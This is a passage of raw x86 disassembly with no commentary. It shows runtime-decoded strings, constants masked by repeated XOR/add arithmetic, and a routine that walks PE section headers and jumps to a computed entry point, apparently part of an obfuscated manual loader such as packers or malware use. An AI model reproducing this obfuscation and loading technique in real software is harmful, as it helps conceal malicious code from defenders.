  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
